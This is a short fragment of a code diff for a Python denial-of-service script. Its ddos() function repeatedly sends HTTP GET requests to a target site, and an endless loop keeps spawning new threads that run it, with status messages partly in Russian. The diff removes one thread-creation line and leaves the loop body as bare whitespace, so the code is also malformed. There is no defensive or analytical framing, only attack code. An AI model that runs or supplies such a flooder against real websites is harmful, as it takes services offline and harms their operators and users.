@@ -15,7 +15,7 @@ def ddos():
   spam2 = requests.get(targ)
   print("[+] Заход на сайт выполнен!")
  for i in range(int(thrnom)):
- thr = Thread(target = ddos) 
+  
 while True:
  threading.Thread(target=ddos).start()
  print('DDOS is running...')
